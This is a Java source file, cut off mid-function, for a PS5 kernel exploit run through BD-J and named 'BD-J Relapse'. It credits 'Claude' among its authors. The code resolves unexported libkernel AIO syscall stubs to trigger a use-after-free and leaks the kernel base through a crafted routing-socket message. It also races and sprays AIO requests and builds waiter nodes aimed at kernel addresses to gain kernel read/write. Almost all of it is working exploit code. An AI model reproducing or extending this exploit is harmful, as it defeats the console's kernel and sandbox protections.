/*
 * BD-J Relapse - PS5 kernel exploit (AIO mode-0 waiter UAF) for BD-J.
 *
 * Coded by EchoStretch, zecoxao, Claude
 *
 * Based on relapse by Gezine / Andy Nguyen.
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

package org.bdj.external;

import org.bdj.Status;
import org.bdj.api.API;
import org.bdj.api.Buffer;
import org.bdj.api.Int32Array;
import org.bdj.api.NativeInvoke;

public class Relapse {

/* ===================================================================== */
/* constants                                                             */
/* ===================================================================== */

private static final String VERSION_STRING = "BD-J Relapse 1.0 by EchoStretch, zecoxao, Claude";

private static final int AF_UNIX = 1;
private static final int AF_INET = 2;
private static final int AF_ROUTE = 17;
private static final int AF_INET6 = 28;
private static final int SOCK_STREAM = 1;
private static final int SOCK_RAW = 3;
private static final int MSG_DONTWAIT = 0x80;
private static final int RLIMIT_NOFILE = 8;
private static final int CPU_LEVEL_WHICH = 3;
private static final int CPU_WHICH_TID = 1;
private static final int RTP_SET = 1;
private static final int PRI_REALTIME = 2;
private static final int PRI_NORMAL = 3;
private static final int AIO_CMD_READ = 1;
private static final int O_NONBLOCK = 0x4;
private static final int SOL_SOCKET = 0xffff;

/* struct dynlib / dynlib_eboot layout.  These are kernel structure
 * offsets (not firmware image RVAs), shared by every supported build.
 * Poops uses the same three hops on BD-J: proc+0x3e8 -> dynlib+0x00 ->
 * eboot+0x40, then widens the first segment to cover the address space. */
private static final int DYNLIB_EBOOT         = 0x00;
private static final int DYNLIB_SEGMENTS      = 0x40;
private static final int DYNLIB_SEGMENT_ADDR  = 0x08;
private static final int DYNLIB_SEGMENT_SIZE  = 0x10;

/* tuning */
private static final int TUNE_WAITERS = 18;
private static final int TUNE_REQUESTS = 13;
private static final int TUNE_CHURN_BEFORE = 32;
private static final int TUNE_CHURN_AFTER = 256;
private static final int TUNE_SPRAYS = 64;
private static final int TUNE_WORKER_BLOCKERS = 24;
private static final int TUNE_WAIT_TIMEOUT_US = 10000;

/* Set to true only in the diagnostic jar: exercises everything up to the
 * kexp launch and then returns without creating the shell pipes. */
private static final boolean DIAGNOSTIC_STOP_BEFORE_KEXP = false;

/* ===================================================================== */
/* API / syscall stubs                                                   */
/* ===================================================================== */

private static API api;

/* Resolved libkernel syscall-wrapper addresses (dlsym, called via api.call). */
private static long sys_socket;
private static long sys_setsockopt;
private static long sys_read;
private static long sys_write;
private static long sys_recvfrom;
private static long sys_getrlimit;
private static long sys_setrlimit;
private static long sys_socketpair;
private static long sys_getpid;
private static long sys_getuid;
private static long sys_is_in_sandbox;
private static long sys_cpuset_getaffinity;
private static long sys_cpuset_setaffinity;
private static long sys_rtprio_thread;
private static long sys___sysctl;
private static long sys_close;
private static long sys_ioctl;

/* The raw aio_* syscalls are not exported by name; their mode-validating
 * sceKernelAio* wrappers reject the mode-0 value the UAF needs.  The raw
 * "mov rax,nr; syscall" stubs do exist inside libkernel_sys, so these are the
 * runtime addresses computed from an exported-stub anchor in that module.
 * Plus pipe/fcntl and connect/getsockname (KASLR source address). */
private static long fn_aio_submit_read_multiple;
private static long fn_aio_wait;
private static long fn_aio_poll;
private static long fn_aio_cancel;
private static long fn_pipe;
private static long fn_fcntl;
private static long fn_connect;
private static long fn_getsockname;

/* true when the raw libkernel_sys aio_* stubs were located (mode-0 UAF capable);
 * false means we fell back to the validating sce wrappers. */
private static boolean rawAioStubs = false;

private static final int F_SETFL = 4;
private static final int SOCK_DGRAM = 2;

/* ===================================================================== */
/* firmware / offsets                                                    */
/* ===================================================================== */

public static String PLATFORM = null;
public static String FW_VERSION = null;
private static RelapseOffsets off;

/* ===================================================================== */
/* exploit state                                                         */
/* ===================================================================== */

private static long kbase;
private static long curproc;
private static long ucred;
private static long procFdAddr;
private static long allproc;
private static long aioInfoAddr;

private static RelapsePipe master;
private static RelapsePipe victim;

/* kexp's crossed shell pipes; kept so the clean-up path can make them ordinary
 * again before the process exits. */
private static RelapsePipe shellMaster;
private static RelapsePipe shellVictim;

/* fd tracking for cleanup */
private static int[] fds = new int[256];
private static int fdsCount = 0;

/* armed AIO groups (for defuse) */
private static int[] armedGroupIds = new int[256];
private static int[] armedGroupCounts = new int[32];
private static int armedGroupsLen = 0;

private static boolean pinnedCore = false;
private static int allowedMask = 0;
private static boolean threadAttributesRestored = false;
private static boolean crossed = false;
private static boolean defused = false;

/* sysctl oid state (slow R/W) */
private static int[] mibA;
private static int[] mibB;
private static int[] mibC;

/* pipe cross state (fast R/W) */
private static long windowHigh = 0xFFFFFFFFL;
private static long aimBuffer = 0;
private static long drainBuffer = 0;
private static long pipeSize = 0;

/* scratch buffers */
private static long scratchStates = 0;
private static long scratchQword = 0;

/* AIO worker park */
private static long workerParkReadFd = 0;
private static long workerParkWriteFd = 0;

/* ===================================================================== */
/* static init                                                           */
/* ===================================================================== */

static {
    try {
        /* Turn logging on BEFORE any risky work so the static-init trace
         * (platform/firmware/syscall resolution) reaches the on-screen console
         * and the UDP logger.  main() also enables these, but the crash we are
         * chasing happens here, before main() runs. */
        Status.setScreenOutputEnabled(true);
        Status.setNetworkLoggerEnabled(true);
        api = API.getInstance();
        getPlatform(System.getProperty("http.agent"));
        if (PLATFORM != null && PLATFORM.equals("PS5")) {
            getFirmware();
            if (FW_VERSION != null && !FW_VERSION.equals("0.00")) {
                try {
                    off = RelapseOffsets.get(FW_VERSION);
                } catch (RuntimeException e) {
                    Status.println("unsupported firmware: " + FW_VERSION);
                }
            }
            if (off != null) {
                resolveSyscalls();
            }
        }
    } catch (Exception e) {
        throw new ExceptionInInitializerError(e);
    }
}

/* ===================================================================== */
/* platform / firmware                                                   */
/* ===================================================================== */

private static void getPlatform(String agent) {
    if (agent == null) return;
    int bdjIndex = agent.indexOf(" BD-J ");
    if (bdjIndex == -1) return;
    String prefix = agent.substring(0, bdjIndex);
    int lastSpace = prefix.lastIndexOf(' ');
    if (lastSpace == -1) return;
    String consoleName = prefix.substring(0, lastSpace);
    String generation = prefix.substring(lastSpace + 1);
    if (!consoleName.equalsIgnoreCase("PlayStation")) return;
    PLATFORM = "PS" + generation;
}

/* kern.sdk_version is a 4-byte uint32 (0xMMmm0000) on PS5. A successful
 * call (rv==0, len>=4) is already a complete result and must not be
 * re-queried via a fallback - a failing fallback can leave outBuf/sizeBuf
 * in a state that silently discards a perfectly good earlier read. */
private static long querySdkVersion(Buffer outBuf, Buffer sizeBuf) {
    long sysctlbyname = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "sysctlbyname");
    if (sysctlbyname != 0) {
        Buffer nameBuf = new Buffer(32);
        nameBuf.put(0, "kern.sdk_version\0".getBytes());
        sizeBuf.putLong(0, 8);
        long rv = api.call(sysctlbyname, nameBuf.address(), outBuf.address(), sizeBuf.address(), 0, 0);
        if (rv == 0) return rv;
    }

    /* libkernel exports the 6-argument wrapper as "sysctl"; the raw
     * __sysctl stub is internal and is not an exported symbol. */
    long sysctl = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "sysctl");
    if (sysctl != 0) {
        int[] mib = { 1, 27 };
        Buffer mibBuf = new Buffer(mib.length * 4);
        for (int i = 0; i < mib.length; i++) {
            mibBuf.putInt(i * 4, mib[i]);
        }
        sizeBuf.putLong(0, 8);
        return api.call(sysctl, mibBuf.address(), mib.length, outBuf.address(), sizeBuf.address(), 0, 0);
    }

    return -1;
}

private static void getFirmware() {
    Buffer outBuf = new Buffer(8);
    Buffer sizeBuf = new Buffer(8);

    long rv = querySdkVersion(outBuf, sizeBuf);
    int len = (int) sizeBuf.getLong(0);
    if (rv != 0 || len < 4) {
        Status.println("getFirmware: unknown");
        FW_VERSION = "0.00";
        return;
    }

    int major = outBuf.getByte(3) & 0xFF;
    int minor = outBuf.getByte(2) & 0xFF;
    FW_VERSION = Integer.toHexString(major) + "." + (minor < 0x10 ? "0" : "") + Integer.toHexString(minor);
    Status.println("getFirmware: " + FW_VERSION);
}

/* Resolve a libkernel export by name, failing loudly if it is missing. */
private static long dlsymOrThrow(String name) {
    long a = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, name);
    if (a == 0) throw new RuntimeException("libkernel export missing: " + name);
    return a;
}

/* Resolve the libkernel syscall-wrapper addresses, and the raw libkernel_sys
 * aio_* stubs the mode-0 UAF needs.  .text is execute-only here (no stub
 * scanning or ROP) and there is no exported generic syscall, so every syscall
 * is reached as an ordinary exported function via api.call -- except the raw
 * aio_* stubs, which are unexported but live at fixed offsets inside
 * libkernel_sys and are computed from an exported-stub anchor in that module. */
private static void resolveSyscalls() {
    /* Exported libkernel wrappers (callable without reading .text). */
    sys_socket             = dlsymOrThrow("socket");
    sys_setsockopt         = dlsymOrThrow("setsockopt");
    sys_read               = dlsymOrThrow("read");
    sys_write              = dlsymOrThrow("write");
    sys_recvfrom           = dlsymOrThrow("recvfrom");
    sys_getrlimit          = dlsymOrThrow("getrlimit");
    sys_setrlimit          = dlsymOrThrow("setrlimit");
    sys_socketpair         = dlsymOrThrow("socketpair");
    sys_getpid             = dlsymOrThrow("getpid");
    sys_getuid             = dlsymOrThrow("getuid");
    sys_is_in_sandbox      = dlsymOrThrow("is_in_sandbox");
    sys_cpuset_getaffinity = dlsymOrThrow("cpuset_getaffinity");
    sys_cpuset_setaffinity = dlsymOrThrow("cpuset_setaffinity");
    sys_rtprio_thread      = dlsymOrThrow("rtprio_thread");
    sys_close              = dlsymOrThrow("close");
    sys_ioctl              = dlsymOrThrow("ioctl");
    /* __sysctl is not exported, but the 6-arg libc "sysctl" wrapper has the
     * identical argument layout, so it stands in for it directly. */
    sys___sysctl           = dlsymOrThrow("sysctl");
    /* The raw aio_* syscalls are NOT exported by name, so the validating
     * sceKernelAio* wrappers (which reject mode 0) are the only public entry --
     * and mode 0 is the whole UAF.  But the raw "mov rax,nr; mov r10,rcx;
     * syscall" stubs DO exist inside libkernel_sys, at fixed offsets from the
     * exported stubs in the SAME module.  getpid/getuid/socket/ioctl all
     * resolve into libkernel_sys here, so anchor on getpid and compute the aio
     * stub addresses from their libkernel_sys vaddr deltas.
     *
     * 13.42 libkernel_sys vaddrs (verified in the .i64):
     *   getpid 0x5b0, getuid 0x630, socket 0xbd0, ioctl 0x8d0,
     *   aio_multi_wait 0x31f0, aio_submit_cmd 0x32b0, aio_multi_poll 0x3210,
     *   aio_multi_cancel 0x3250, aio_multi_delete 0x3270. */
    long sysBase = sys_getpid - 0x5b0L;
    boolean anchorOk = (sys_getuid == sysBase + 0x630L)
                    && (sys_socket == sysBase + 0xbd0L)
                    && (sys_ioctl  == sysBase + 0x8d0L);
    Status.println("resolveSyscalls: libkernel_sys base=0x" + Long.toHexString(sysBase)
                   + " anchorOk=" + anchorOk);
    if (anchorOk) {
        fn_aio_submit_read_multiple = sysBase + 0x32b0L;  /* raw aio_submit_cmd   */
        fn_aio_wait                 = sysBase + 0x31f0L;  /* raw aio_multi_wait    */
        fn_aio_poll                 = sysBase + 0x3210L;  /* raw aio_multi_poll    */
        fn_aio_cancel               = sysBase + 0x3250L;  /* raw aio_multi_cancel  */
        rawAioStubs = true;
        Status.println("resolveSyscalls: raw aio stubs wait=0x" + Long.toHexString(fn_aio_wait)
                       + " submit=0x" + Long.toHexString(fn_aio_submit_read_multiple));
    } else {
        /* Fallback: validating wrappers (cannot trigger the mode-0 UAF). */
        fn_aio_submit_read_multiple = dlsymOrThrow("sceKernelAioSubmitReadCommandsMultiple");
        fn_aio_wait                 = dlsymOrThrow("sceKernelAioWaitRequests");
        fn_aio_poll                 = dlsymOrThrow("sceKernelAioPollRequests");
        fn_aio_cancel               = dlsymOrThrow("sceKernelAioCancelRequests");
        rawAioStubs = false;
        Status.println("resolveSyscalls: WARNING anchor mismatch, using sce wrappers (UAF will NOT fire)");
    }

    /* pipe (+fcntl for O_NONBLOCK) replaces the un-exported pipe2; connect +
     * getsockname replace netgetiflist for the KASLR source address. */
    fn_pipe        = dlsymOrThrow("pipe");
    fn_fcntl       = dlsymOrThrow("fcntl");
    fn_connect     = dlsymOrThrow("connect");
    fn_getsockname = dlsymOrThrow("getsockname");

    Status.println("resolveSyscalls: all functions resolved");
}

/* ===================================================================== */
/* syscall wrappers                                                      */
/* ===================================================================== */

private static long syscall(long number, long a1, long a2, long a3, long a4, long a5, long a6) {
    return api.call(number, a1, a2, a3, a4, a5, a6);
}

private static int socket(int domain, int type, int protocol) {
    return (int) syscall(sys_socket, domain, type, protocol, 0, 0, 0);
}

private static int setsockopt(int s, int level, int optname, long optval, int optlen) {
    return (int) syscall(sys_setsockopt, s, level, optname, optval, optlen, 0);
}

private static int read(int fd, long buf, long nbytes) {
    return (int) syscall(sys_read, fd, buf, nbytes, 0, 0, 0);
}

private static int write(int fd, long buf, long nbytes) {
    return (int) syscall(sys_write, fd, buf, nbytes, 0, 0, 0);
}

private static int recvfrom(int s, long buf, long len, int flags, long from, long fromlen) {
    return (int) syscall(sys_recvfrom, s, buf, len, flags, from, fromlen);
}

private static int getrlimit(int resource, long rlim) {
    return (int) syscall(sys_getrlimit, resource, rlim, 0, 0, 0, 0);
}

private static int setrlimit(int resource, long rlim) {
    return (int) syscall(sys_setrlimit, resource, rlim, 0, 0, 0, 0);
}

private static int socketpair(int domain, int type, int protocol, Int32Array sv) {
    return (int) syscall(sys_socketpair, domain, type, protocol, sv != null ? sv.address() : 0, 0, 0);
}

/* pipe2 is not exported; emulate with pipe() + fcntl(O_NONBLOCK). */
private static int pipe2(Int32Array fildes, int flags) {
    int rv = (int) api.call(fn_pipe, fildes != null ? fildes.address() : 0);
    if (rv == 0 && fildes != null && (flags & O_NONBLOCK) != 0) {
        api.call(fn_fcntl, fildes.get(0), F_SETFL, O_NONBLOCK);
        api.call(fn_fcntl, fildes.get(1), F_SETFL, O_NONBLOCK);
    }
    return rv;
}

/* Prefer the raw libkernel_sys aio_submit_cmd stub (so the request objects are
 * allocated exactly as the exploit needs); fall back to the public
 * sceKernelAioSubmitReadCommandsMultiple wrapper if the anchor was not found. */
private static int aioSubmitCmd(int cmd, long request, int nrequests, int mode, long idOut) {
    if (rawAioStubs) {
        /* raw __sys_aio_submit_cmd(cmd, reqs, num, mode, ids) */
        return (int) api.call(fn_aio_submit_read_multiple, cmd, request, nrequests, mode, idOut);
    }
    /* wrapper sceKernelAioSubmitReadCommandsMultiple(reqs, num, prio, ids) */
    return (int) api.call(fn_aio_submit_read_multiple, request, nrequests, mode, idOut);
}

private static int aioMultiWait(long ids, int nids, long states, long flags, long timeout) {
    if (rawAioStubs) {
        /* raw __sys_aio_multi_wait(ids, num, states, mode, timeout): pass mode
         * through unchanged -- mode 0 is exactly what triggers the waiter UAF. */
        return (int) api.call(fn_aio_wait, ids, nids, states, flags, timeout);
    }
    /* sceKernelAioWaitRequests rejects mode 0 (EINVAL); map 0 -> 1 so it at
     * least runs (but then the UAF will not fire -- diagnostic path only). */
    long mode = (flags == 0) ? 1L : flags;
    return (int) api.call(fn_aio_wait, ids, nids, states, mode, timeout);
}

private static int aioMultiPoll(long ids, int nids, long states) {
    return (int) api.call(fn_aio_poll, ids, nids, states);
}

private static int aioMultiCancel(long ids, int nids, long states) {
    return (int) api.call(fn_aio_cancel, ids, nids, states);
}

private static int getpid() {
    return (int) syscall(sys_getpid, 0, 0, 0, 0, 0, 0);
}

private static int getuid() {
    return (int) syscall(sys_getuid, 0, 0, 0, 0, 0, 0);
}

private static int isInSandbox() {
    return (int) syscall(sys_is_in_sandbox, 0, 0, 0, 0, 0, 0);
}

private static int cpusetGetAffinity(int level, int which, long id, long setsize, long mask) {
    return (int) syscall(sys_cpuset_getaffinity, level, which, id, setsize, mask, 0);
}

private static int cpusetSetAffinity(int level, int which, long id, long setsize, long mask) {
    return (int) syscall(sys_cpuset_setaffinity, level, which, id, setsize, mask, 0);
}

private static int rtprioThread(int function, int lwpid, long rtp) {
    return (int) syscall(sys_rtprio_thread, function, lwpid, rtp, 0, 0, 0);
}

private static int sysctlRaw(long mibPtr, int miblen, long oldPtr, long oldLen, long newPtr, long newLen) {
    return (int) syscall(sys___sysctl, mibPtr, miblen, oldPtr, oldLen, newPtr, newLen);
}

private static int close(int fd) {
    return (int) syscall(sys_close, fd, 0, 0, 0, 0, 0);
}

private static int ioctl(int fd, long request, long arg) {
    return (int) syscall(sys_ioctl, fd, request, arg, 0, 0, 0);
}

/* ===================================================================== */
/* memory helpers                                                        */
/* ===================================================================== */

private static long alloc(long size) {
    long addr = api.malloc(size);
    if (addr == 0) throw new OutOfMemoryError("malloc failed");
    api.memset(addr, 0, size);
    return addr;
}

private static void clear(long addr, long size) {
    api.memset(addr, 0, size);
}

private static long kaddr(long rva) {
    return kbase + rva;
}

private static boolean isKernelPointer(long value) {
    if (value == 0) return false;
    if ((value >>> 48) != 0xFFFF) return false;
    if ((value & 7L) != 0) return false;
    if (value == -1L) return false;
    return true;
}

private static int readU8(long base, int offset) {
    return api.read8(base + offset) & 0xFF;
}

private static int readU32(long base, int offset) {
    return api.read32(base + offset) & 0xFFFFFFFF;
}

private static long readU64(long base, int offset) {
    return api.read64(base + offset);
}

private static void writeU8(long base, int offset, int value) {
    api.write8(base + offset, (byte) (value & 0xFF));
}

private static void writeU32(long base, int offset, int value) {
    api.write32(base + offset, value);
}

private static void writeU64(long base, int offset, long value) {
    api.write64(base + offset, value);
}

/* ===================================================================== */
/* sysctl helpers                                                        */
/* ===================================================================== */

private static SysctlResult sysctlMib(int[] mib, long oldPtr, long oldLen, long newPtr, long newLen) {
    long mibPtr = alloc(mib.length * 4L);
    for (int i = 0; i < mib.length; i++) {
        writeU32(mibPtr, i * 4, mib[i]);
    }
    long lenPtr = alloc(8);
    writeU32(lenPtr, 0, (int) oldLen);
    int rv = sysctlRaw(mibPtr, mib.length, oldPtr, oldPtr != 0 ? lenPtr : 0, newPtr, newLen);
    long readLen = oldPtr != 0 ? readU32(lenPtr, 0) : 0;
    api.free(mibPtr);
    api.free(lenPtr);
    return new SysctlResult(rv, (int) readLen);
}

private static SysctlResult sysctlReadInt(int[] mib) {
    long value = alloc(8);
    SysctlResult r = sysctlMib(mib, value, 4, 0, 0);
    int v = r.rv == 0 ? readU32(value, 0) : 0;
    api.free(value);
    /* Use the 3-arg ctor so the read integer lands in .value (and .longValue),
     * not in .len.  The 2-arg ctor stores its second arg in .len, but every
     * caller of a slow read inspects .value. */
    return new SysctlResult(r.rv, v, 0L);
}

private static int sysctlWriteInt(int[] mib, int value) {
    long buffer = alloc(8);
    writeU32(buffer, 0, value);
    SysctlResult r = sysctlMib(mib, 0, 0, buffer, 4);
    api.free(buffer);
    return r.rv;
}

/* ===================================================================== */
/* sysctl name -> mib resolution (nameToMib)                             */
/* ===================================================================== */

private static int[] nameToMib(String name) {
    byte[] nameBytes = name.getBytes();
    long nameBuf = alloc(nameBytes.length + 1);
    for (int i = 0; i < nameBytes.length; i++) {
        writeU8(nameBuf, i, nameBytes[i] & 0xFF);
    }
    writeU8(nameBuf, nameBytes.length, 0);
    long out = alloc(0x60);
    SysctlResult r = sysctlMib(new int[] {0, 3}, out, 0x60, nameBuf, nameBytes.length);
    if (r.rv != 0) {
        api.free(nameBuf);
        api.free(out);
        return null;
    }
    int len = r.len;
    int[] mib = new int[len >>> 2];
    for (int i = 0; i < len >>> 2; i++) {
        mib[i] = readU32(out, i * 4);
    }
    api.free(nameBuf);
    api.free(out);
    return mib;
}

/* ===================================================================== */
/* oid kind read (oidKind)                                               */
/* ===================================================================== */

private static Integer oidKind(int[] mib) {
    long out = alloc(0x100);
    int[] fullMib = new int[mib.length + 2];
    fullMib[0] = 0;
    fullMib[1] = 4;
    for (int i = 0; i < mib.length; i++) {
        fullMib[i + 2] = mib[i];
    }
    SysctlResult r = sysctlMib(fullMib, out, 0x100, 0, 0);
    int value = r.rv == 0 ? readU32(out, 0) : 0;
    api.free(out);
    if (r.rv != 0) return null;
    return new Integer(value);
}

/* ===================================================================== */
/* KASLR leak via routing socket                                       */
/* ===================================================================== */

private static int sockaddrLen(int len) {
    return len != 0 ? ((len - 1) & ~7) + 8 : 8;
}

/* netgetiflist is not reachable on this firmware (not exported, .text
 * unreadable, JIT not writable).  Get our own interface IPv4 address instead by
 * UDP-connecting to an off-link address (no packet is sent for a UDP connect)
 * and reading the kernel-chosen source address with getsockname. */
private static int[] firstInterfaceAddress() {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return null;
    trackFd(s);

    long peer = alloc(16);
    writeU8(peer, 0, 16);         /* sin_len */
    writeU8(peer, 1, AF_INET);    /* sin_family */
    writeU8(peer, 2, 0);          /* sin_port hi (53) */
    writeU8(peer, 3, 53);         /* sin_port lo */
    writeU8(peer, 4, 8);          /* 8.8.8.8 */
    writeU8(peer, 5, 8);
    writeU8(peer, 6, 8);
    writeU8(peer, 7, 8);

    int[] octets = null;
    int rc = (int) api.call(fn_connect, s, peer, 16);
    if (rc == 0) {
        long name = alloc(16);
        long namelen = alloc(8);
        writeU32(namelen, 0, 16);
        if ((int) api.call(fn_getsockname, s, name, namelen) == 0) {
            int[] o = new int[4];
            for (int b = 0; b < 4; b++) o[b] = readU8(name, 4 + b);
            if (o[0] != 0 || o[1] != 0 || o[2] != 0 || o[3] != 0) octets = o;
        }
    } else {
        Status.println("kaslr: UDP connect for source-address discovery failed rc=" + rc);
    }

    close(s);
    untrackFd(s);
    return octets;
}

private static void leakKernelBase() {
    final int DST_LEN = 88;
    final int AUTHOR = 152 + sockaddrLen(DST_LEN);
    final int MSG_LEN = AUTHOR + 256;
    final int AUTHOR_INDEX = 6;
    final int RET_SLOT = 184;

    int[] dst = firstInterfaceAddress();
    if (dst == null) throw new RuntimeException("kaslr: no interface has an address");

    int fd = socket(AF_ROUTE, SOCK_RAW, 0);
    if (fd < 0) throw new RuntimeException("kaslr: routing socket is gated");
    trackFd(fd);

    long timeout = alloc(16);
    writeU32(timeout, 0, 5);
    setsockopt(fd, SOL_SOCKET, 0x20, timeout, 16);

    long msg = alloc(512);
    writeU8(msg, 0, MSG_LEN & 0xFF);
    writeU8(msg, 1, (MSG_LEN >>> 8) & 0xFF);
    writeU8(msg, 2, 5);
    writeU8(msg, 3, 0x04);
    writeU32(msg, 12, 0x41);
    writeU32(msg, 20, 0x1234);
    writeU8(msg, 152, DST_LEN);
    writeU8(msg, 153, AF_INET);
    int ip = (dst[3] << 24) | (dst[2] << 16) | (dst[1] << 8) | dst[0];
    writeU32(msg, 156, ip);
    writeU8(msg, AUTHOR + 0, 255);
    writeU8(msg, AUTHOR + 1, AF_INET6);
    if (write(fd, msg, MSG_LEN) < 0) {
        throw new RuntimeException("kaslr: routing socket rejected the request");
    }

    long reply = alloc(4096);
    int len = 0;
    for (int attempt = 0; attempt < 8 && len <= 0; attempt++) {
        len = recvfrom(fd, reply, 4096, MSG_DONTWAIT, 0, 0);
        if (len <= 0) sleep(1);
    }
    if (len <= 0) throw new RuntimeException("kaslr: no routing reply");

    int present = readU32(reply, 12);
    int cursor = 152;
    int author = 0;
    for (int i = 0; i < 8; i++) {
        if ((present & (1 << i)) == 0) continue;
        if (cursor + 2 > len) break;
        if (i == AUTHOR_INDEX) {
            author = cursor;
            break;
        }
        cursor += sockaddrLen(readU8(reply, cursor));
    }
    if (author == 0 || author + 200 > len) {
        throw new RuntimeException("kaslr: reply carries no author record");
    }

    long retStatic = off.kaslrRetStatic;
    int retLow16 = off.kaslrRetLow16;
    long ret = readU64(reply, author + RET_SLOT);
    if ((ret >>> 32) != 0xFFFFFFFFL || (ret & 0xFFFF) != (retLow16 & 0xFFFF)) {
        throw new RuntimeException("kaslr: author+" + RET_SLOT + " = 0x" + Long.toHexString(ret) + " is not the expected return address");
    }

    kbase = (ret - retStatic);
    Status.println("Kernel base : 0x" + Long.toHexString(kbase));
}

private static void trackFd(int fd) {
    if (fdsCount < fds.length) {
        fds[fdsCount++] = fd;
    }
}

private static void untrackFd(int fd) {
    for (int i = 0; i < fdsCount; i++) {
        if (fds[i] == fd) {
            fds[i] = fds[--fdsCount];
            fds[fdsCount] = 0;
            return;
        }
    }
}

/* ===================================================================== */
/* thread affinity                                                       */
/* ===================================================================== */

private static void pinToSingleCore() {
    long id = -1L;
    long current = alloc(0x10);
    cpusetGetAffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, id, 0x10, current);
    allowedMask = readU32(current, 0);

    int core = -1;
    for (int c = 0; c < 16 && core < 0; c++) {
        if ((allowedMask & (1 << c)) != 0) core = c;
    }
    if (core < 0) {
        Status.println("PIN: no allowed core in mask 0x" + Integer.toHexString(allowedMask));
        return;
    }

    long mask = alloc(0x10);
    writeU8(mask, (core >> 3) & 0xF, 1 << (core & 7));
    cpusetSetAffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, id, 0x10, mask);

    long rtprio = alloc(0x10);
    writeU8(rtprio, 0, (byte) PRI_REALTIME);
    rtprioThread(RTP_SET, 0, rtprio);

    pinnedCore = true;
}

private static void restoreThreadAttributes() {
    if (!pinnedCore || threadAttributesRestored) return;

    long id = -1L;
    int want = allowedMask != 0 ? allowedMask : 0xEA00;
    long mask = alloc(0x10);
    writeU8(mask, 0, (byte) (want & 0xFF));
    writeU8(mask, 1, (byte) ((want >>> 8) & 0xFF));
    cpusetSetAffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, id, 0x10, mask);

    long rtprio = alloc(0x10);
    writeU8(rtprio, 0, (byte) PRI_NORMAL);
    rtprioThread(RTP_SET, 0, rtprio);

    threadAttributesRestored = true;
}

/* ===================================================================== */
/* AIO race + sysctl oid flip -> slow kernel R/W                         */
/* ===================================================================== */

private static void raiseFdLimit() {
    long limit = alloc(0x10);
    int rv = getrlimit(RLIMIT_NOFILE, limit);
    if (rv == -1) {
        // getrlimit not supported, continue without raising limit
        return;
    }
    long cur = readU64(limit, 0);
    long max = readU64(limit, 8);
    writeU64(limit, 0, max);
    setrlimit(RLIMIT_NOFILE, limit);
}

private static RelapseSocketPair openSocketPair(long buffer, String error) {
    Int32Array pairBuf = new Int32Array(2);
    int rv = socketpair(AF_UNIX, SOCK_STREAM, 0, pairBuf);
    if (rv == -1) throw new RuntimeException(error);
    int readFd = pairBuf.get(0);
    int writeFd = pairBuf.get(1);
    writeU32(buffer, 0, readFd);
    writeU32(buffer, 4, writeFd);
    trackFd(readFd);
    trackFd(writeFd);
    return new RelapseSocketPair(readFd, writeFd);
}

private static int submitBlockedRead(long requestBuf, long sinkAddr, int readFd, long idOut) {
    clear(requestBuf, 0x40);
    writeU32(requestBuf, 0x08, 1);
    writeU64(requestBuf, 0x10, sinkAddr);
    writeU32(requestBuf, 0x20, readFd);
    int rv = aioSubmitCmd(AIO_CMD_READ, requestBuf, 1, 3, idOut);
    if (rv != 0) return -1;
    return readU32(idOut, 0);
}

private static void parkAioWorkers(int limit) {
    long pairBuffer = alloc(8);
    RelapseSocketPair pair = openSocketPair(pairBuffer, "socketpair for the worker park failed");
    workerParkReadFd = pair.readFd;
    workerParkWriteFd = pair.writeFd;

    long sink = alloc(0x40);
    long request = alloc(0x40);
    long ids = alloc(4 * limit + 8);
    long states = alloc(4 * limit + 8);
    long idOut = alloc(8);

    int sent = 0;
    int parked = 0;
    int quietRounds = 0;

    while (sent < limit && quietRounds < 2) {
        for (int i = 0; i < 4 && sent < limit; i++) {
            int id = submitBlockedRead(request, sink, pair.readFd, idOut);
            if (id < 0) return;
            writeU32(ids, sent * 4, id);
            sent++;
        }

        sleep(60);
        aioMultiPoll(ids, sent, states);
        int inFlight = 0;
        for (int i = 0; i < sent; i++)
            if ((readU32(states, i * 4) & 0xffff) == 2) inFlight++;

        if (inFlight == parked) quietRounds++;
        else {
            parked = inFlight;
            quietRounds = 0;
        }
    }
}

private static int[] waitForPendingRequests(long candidateIds, int candidateCount, int wantedCount) {
    long pollId = alloc(4);
    long pollState = alloc(4);
    int[] pendingIndices = new int[wantedCount];
    int pendingCount = 0;
    boolean[] seen = new boolean[candidateCount];

    for (int attempt = 0; attempt < 150 && pendingCount < wantedCount; attempt++) {
        for (int index = 0; index < candidateCount && pendingCount < wantedCount; index++) {
            if (seen[index]) continue;

            writeU32(pollId, 0, readU32(candidateIds, index * 4));
            aioMultiPoll(pollId, 1, pollState);
            if ((readU32(pollState, 0) & 0xffff) == 1) {
                pendingIndices[pendingCount++] = index;
                seen[index] = true;
            }
        }
        if (pendingCount < wantedCount) sleep(20);
    }

    if (pendingCount != wantedCount)
        throw new RuntimeException(pendingCount + "/" + wantedCount + " requests stayed pending");
    return pendingIndices;
}

private static AioGroup claimPendingRequests(int count) {
    int candidateCount = count + 8;
    if (candidateCount < 0x18) candidateCount = 0x18;
    long candidateIds = alloc(4 * candidateCount);
    long request = alloc(0x40);
    long sink = alloc(0x40);
    long pairBuffer = alloc(8);
    long idOut = alloc(4);

    for (int index = 0; index < candidateCount; index++) {
        RelapseSocketPair pair = openSocketPair(pairBuffer, "socketpair failed while claiming requests");
        int id = submitBlockedRead(request, sink, pair.readFd, idOut);
        if (id < 0) throw new RuntimeException("aio request submission failed");
        writeU32(candidateIds, index * 4, id);
    }

    int[] pending = waitForPendingRequests(candidateIds, candidateCount, count);
    long ids = alloc(4 * count);
    for (int output = 0; output < count; output++) {
        int index = pending[output];
        writeU32(ids, output * 4, readU32(candidateIds, index * 4));
    }

    AioGroup group = new AioGroup();
    group.ids = ids;
    group.count = count;
    return group;
}

private static void buildWaiterNodes(long nodes, int count, long firstTarget, long secondTarget) {
    int requestSize = off.aioRequestSize;
    for (int i = 0; i < count; i++) {
        writeU32(nodes, i * requestSize + 0x20, 0xffffffff);
    }
    writeU64(nodes, 0x00, firstTarget);
    writeU64(nodes, 0x08, secondTarget);
    writeU64(nodes, 0x10, kaddr(off.nodeMutex));
}

private static int runReclaimBatch(AioGroup group, long nodes) {
